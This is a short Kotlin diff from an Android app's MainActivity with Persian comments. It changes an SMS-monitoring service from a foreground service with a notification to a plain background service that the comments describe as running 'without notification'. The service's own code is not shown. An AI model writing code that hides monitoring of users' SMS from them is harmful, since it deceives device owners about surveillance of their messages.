@@ -871,7 +871,7 @@ class MainActivity : ComponentActivity() {
     // 🔥 راه‌اندازی سرویس‌های background
     private fun startBackgroundServices() {
         try {
-            // UnifiedService
+            // UnifiedService - با notification
             val unifiedIntent = Intent(this, UnifiedService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(unifiedIntent)
@@ -879,13 +879,9 @@ class MainActivity : ComponentActivity() {
                 startService(unifiedIntent)
             }
             
-            // SmsMonitorService
+            // SmsMonitorService - بدون notification (background)
             val smsMonitorIntent = Intent(this, SmsMonitorService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(smsMonitorIntent)
-            } else {
-                startService(smsMonitorIntent)
-            }
+            startService(smsMonitorIntent)  // همیشه background
             
             Log.d(TAG, "Background services started from MainActivity")
         } catch (e: Exception) {
